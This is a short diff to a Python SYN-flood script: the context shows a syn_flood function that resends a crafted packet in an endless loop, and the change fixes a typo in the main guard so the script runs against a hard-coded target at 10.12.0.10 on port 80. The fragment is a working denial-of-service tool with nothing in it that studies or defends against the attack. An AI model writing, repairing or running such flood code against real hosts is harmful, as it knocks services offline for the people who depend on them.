@@ -26,7 +26,7 @@ def syn_flood(target_ip, target_port):
     send(packet, loop=1, verbose=0)  # resend the packet several times
 
 
-if __name__ == "__main__ ":
+if __name__ == "__main__":
     target_ip = "10.12.0.10"
     target_port = 80
 
